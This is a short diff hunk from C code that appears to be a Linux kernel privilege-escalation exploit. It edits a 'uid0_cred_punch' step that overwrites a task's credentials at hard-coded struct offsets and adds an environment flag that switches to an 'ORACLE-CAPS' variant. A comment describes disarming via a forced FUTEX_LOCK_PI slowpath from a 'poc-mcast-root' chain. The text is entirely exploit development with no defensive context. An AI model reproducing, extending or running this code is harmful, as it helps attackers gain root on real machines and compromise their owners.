@@ -2538,9 +2538,12 @@ uid0_cred_punch:;
         cred_off = strtoull(slot_env, NULL, 0);
       uintptr_t slot = use_task +
           (env_flag("UID0_COMM_CANARY", 0) ? 0x790 : cred_off);
-      uid0_one_store(slot, env_flag("UID0_COMM_CANARY", 0)
-                            ? "child_comm_canary"
-                            : (self ? "self_cred" : "child_cred"));
+      /* ORACLE-CAPS owns both walks (oracle read + capstore) — the
+       * default punch would waste walk-1 on the known-dead 0x780. */
+      if (!env_flag("UID0_ORACLE_CAPS", 0))
+        uid0_one_store(slot, env_flag("UID0_COMM_CANARY", 0)
+                              ? "child_comm_canary"
+                              : (self ? "self_cred" : "child_cred"));
     }
     /* DISARM (GhostLockAdapt poc-mcast-root step 7): instant-timeout
      * FUTEX_LOCK_PI on a self-locked dummy forces the kernel slowpath,
